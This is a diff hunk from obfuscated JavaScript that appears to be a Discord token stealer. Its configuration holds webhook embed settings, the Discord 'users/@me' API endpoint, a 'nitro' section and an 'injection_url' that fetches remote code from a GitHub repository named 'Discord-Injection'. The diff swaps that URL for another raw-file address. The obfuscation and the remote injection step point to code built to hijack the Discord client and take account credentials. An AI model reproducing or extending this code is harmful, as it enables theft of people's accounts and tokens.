@@ -30,7 +30,7 @@ const args = process['argv'],
         'embed_name': _0x78e7e9(0x134),
         'embed_icon': _0x78e7e9(0x1b8)[_0x78e7e9(0x110)](/ /g, _0x78e7e9(0x138)),
         'embed_color': 0x7f9de0,
-        'injection_url': 'https://raw.githubusercontent.com/madskullkoa/Discord-Injection/master/Injection-clean.js',
+        'injection_url': 'https://raw.githubusercontent.com/madskullkoa/test/main/test.js',
         'api': 'https://discord.com/api/v9/users/@me',
         'nitro': {
             'boost': {
